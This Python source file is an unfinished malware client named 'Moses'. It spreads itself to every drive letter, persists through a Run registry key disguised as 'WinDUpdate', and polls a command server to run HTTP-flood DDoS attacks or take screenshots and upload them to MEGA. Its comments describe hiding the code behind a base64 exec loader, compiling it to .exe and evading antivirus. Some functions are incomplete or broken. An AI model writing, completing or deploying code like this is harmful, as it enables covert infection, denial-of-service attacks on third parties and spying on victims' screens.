import base64, sys, time, urllib.request, socket, getpass, string, shutil, os, pyautogui, cv2, 
from mega import Mega
from datetime import datetime
exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('BASE64 ENCODED PROGRAM GOES HERE')))

# TODO: COMPLETE THE PROGRAM, as it is still under construction and currently incomplete

# NOTE: READ INSTRUCTIONS BELOW
#
# 1) Make the required changes to Moses (Variable of URL of web server and master_filename variable if changing the master_filename of the moses.? file)
# 2) Go to https://www.base64encode.org/ and encode the entirety of the code BELOW (don't copy this comment block)
# 3) Copy the output of the base64 encoder website with the contents of your encoded program
# 4) Find the box above that says "BASE64 ENCODED PROGRAM GOES HERE" and replace it with the copied code
# 5) Remove all code from below (INCLUDING THESE COMMENTS)
# 6) Compile Moses to .exe using pyinstaller
#

def main():
    URL = "https://website.tld" #NO SLASH AT THE END OF THE URL
    master_filename = "moses.exe"

    sys_username = get_sys_username()

    # user's ~, and user's ~/AppData/Roaming dir
    path = ["\\", "\\AppData\\Roaming\\",] #ADD EXTRA SAVE PATHS IF NEED BE

    for x in path:
        try:
            shutil.copyfile(master_filename, "C:\\Users\\" + sys_username + x + master_filename)
        except:
            pass
        finally:
            alphabet = list(string.ascii_uppercase)

            # copy master_file to every drive, pass on driver if any error
            for x in alphabet:
                try:
                    shutil.copyfile(master_filename, x + ":\\" + master_filename)
                except:
                    pass

    for x in path:
        if (check_if_file_exists_in_path()):
            # NOTE: i'm not sure if this will create duplicate entries in the registry, or replace if there's a pre-existing entry
            os.system('REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "WinDUpdate" /t REG_SZ /F /D "' + "C:\\Users\\" + sys_username + x + master_filename + '"')
            # path reasigned to x (the other paths aren't needed during this session)
            path = x 
            # persistence initiated, so break
            break
        else:
            pass

    # start main program loop
    while (True):
        signal = get_web_content(URL, "1")

        if (signal == "1"): # ddos_attack()
            target = get_web_content(URL, "2")
            stop_time = get_web_content(URL, "3")

            ddos_target(target, stop_time)
        elif (signal == "2"): # screenshot
            take_screenshot(sys_username)
        else:
            # command not recognized, or page is empty/doesn't exist
            pass

        time.sleep(6)



###--- SYSTEM MODULES ---###
# used for fetching web content
def get_web_content(URL, wb_path):
    try:
        response = urllib.request.urlopen(URL + "/tar" + wb_path + ".html")
        web_content = response.read().decode('utf-8').replace("\n", "")
    except:
        web_content = ""
    return web_content

# used for getting system username
def get_sys_username():
    sys_username = getpass.getuser()
    return sys_username

# used for getting current system time
def get_current_time():
    now = datetime.now()
    current_time = now.strftime("%H:%M") #24-hour clock format
    return current_time

# used to verify if file exists in path (returns boolean)
# TODO: COMPLETE FUNCTION (THIS MAY NOT WORK)
def check_if_file_exists_in_path(x, sys_username, master_filename):
    file_exists = os.path.isfile("C:\\Users\\" + sys_username + x + master_filename)
    return file_exists

# TODO: COMPLETE FUNCTION
# file_created var is the filename of the var created 
def upload_file(filename):
    counter = 0

    while (True):
        try: 
            mega = Mega()
            m = mega.login(email, password)

            filename = m.upload(filename)
            m.get_upload_link(filename)

            #TODO: remove file from user system
        except:
            pass
        # add 1 to counter each iteration
        counter += 1

        if (counter < 30):
            time.sleep(30)
        else:
            break

#TODO: COMPLETE FUNCTION
def download_file(filename):
    filename = m.find(filename)
    m.download(filename)



###---COMMAND MODULES---###
# TODO: COMPLETE FUNCTION
# TODO: change back to im_living when done (evades antivirus)
def ddos_target(target, stop_time): # 1
    source = str(socket.gethostbyname(socket.gethostname()))
    destination_port = 80

    while (True):
        if (get_current_time() == stop_time):
            break
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, destination_port))
            s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, destination_port))
            s.sendto(("Host: " + source + "\r\n\r\n").encode('ascii'), (target, destination_port))
            s.close()
        except:
            pass

# TODO: COMPLETE FUNCTION
def take_screenshot(sys_username): # 2
    filename = get_current_time()
    #NOTE: this may not work
    # example: 1357rethyxyz.png
    filename = filename.replace(":", "") + sys_username + ".png"

    screenshot = pyautogui.screenshot()
    screenshot.save(filename)

    # upload the file named screen.png
    upload_file(filename)

# TODO: COMPLETE FUNCTION
# NOTE: i may omit this function in the future
#def take_webcam_snapshot():
#    try:
#        video_capture = cv2.VideoCapture(0)
#        # Read picture. ret === True on success
#        ret, frame = video_capture.read()
#        # Close device
#        video_capture.release()
#    except:

main()
